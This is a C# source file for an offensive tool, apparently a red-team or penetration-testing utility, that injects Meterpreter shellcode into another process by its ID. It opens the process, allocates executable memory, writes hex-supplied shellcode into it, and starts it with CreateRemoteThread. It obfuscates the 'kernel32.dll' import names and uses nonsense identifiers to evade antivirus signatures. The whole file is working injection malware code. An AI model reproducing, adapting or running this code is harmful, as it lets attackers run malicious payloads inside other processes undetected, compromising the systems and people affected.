using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
// using System.Linq;
using System.Text;

namespace NativePayload_Tinjectionx
{
    public static class Xclass
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040
        }

        [DllImport("ke"+"rnel3"+"2.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel"+"32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ke"+"rne"+"l32"+"."+"dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("ke" + "rnel3" + "2.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("ke" + "rne" + "l32" + "." + "dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        public static IntPtr OpenPol(this UInt32 polkattepolkkatepolpolpolpol, Int32 Injection_to_PID)
        {
            IntPtr _poul_paul_pual = OpenProcess(ProcessAccessFlags.All, false, Injection_to_PID);
            return _poul_paul_pual;
        }

        public static IntPtr heypol_heypol_heypol(this Int32 heypolheyyypooolheyyypoool, IntPtr _xhn,Int32 len) 
        {
            IntPtr heypol = VirtualAllocEx(_xhn, IntPtr.Zero, (uint)len, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            return heypol;
        }

        public static void dilndando_rimbangoda_dinbadloo (this string polpolpol ,IntPtr _xhn,IntPtr v,byte[] b,UIntPtr o) 
        {
            WriteProcessMemory(_xhn, v, b, (uint)b.Length, out o);
        }

        public static IntPtr CreateIevanPolkka(this IntPtr doboddabadtherialeh_polpolpol, IntPtr _x,IntPtr _vax,uint o) 
        {
            IntPtr donbadidonbandidonba = CreateRemoteThread(_x, IntPtr.Zero, 0, _vax, IntPtr.Zero, 0, out o);
            return donbadidonbandidonba;
        }

    }
    class Program
    {
      
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_Tinjectionx , Published by Damon Mohammadbagher , Jan 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Injecting Meterpreter Payload bytes to Other Process");
            Console.WriteLine();



            /// step I
            string[] X = args[1].Split(',');
            int TP = Convert.ToInt32(args[0]);
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("[!] Injection Started Time {0}", DateTime.Now.ToString());
            Console.WriteLine("[!] Payload Length {0}", X.Length.ToString());
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[>] Injecting Meterpreter Payload to ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("{0}:{1} ", Process.GetProcessById(TP).ProcessName, Process.GetProcessById(TP).Id.ToString());
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("Process");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine();
            Console.WriteLine("[!] Thread Injection Done Time {0}", DateTime.Now.ToString());
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Bingo X Meterpreter Session by Remote Thread Injection Method  ;)");
            Console.WriteLine();

            byte[] Xpayload = new byte[X.Length];

            for (int i = 0; i < X.Length;)
            {
                Xpayload[i] = Convert.ToByte(X[i], 16);
                i++;
            }

            UInt32 ievan_Polkka = 0;
            IntPtr ievan = ievan_Polkka.OpenPol(TP);

            IntPtr Polkka = Convert.ToInt32("2021").heypol_heypol_heypol(ievan, Xpayload.Length);

            UIntPtr helypatahelypata = UIntPtr.Zero;
            "ievan.polkka".dilndando_rimbangoda_dinbadloo(ievan, Polkka, Xpayload, helypatahelypata);


            uint tid_pol = 0;
            IntPtr SpecialThanks_to_IevanPolkka_LOITUMA_Band = IntPtr.Zero;
            SpecialThanks_to_IevanPolkka_LOITUMA_Band.CreateIevanPolkka(ievan, Polkka, tid_pol);

            /// X technique + Ievan_Polkka Song = this code ;)




        }
    }
}
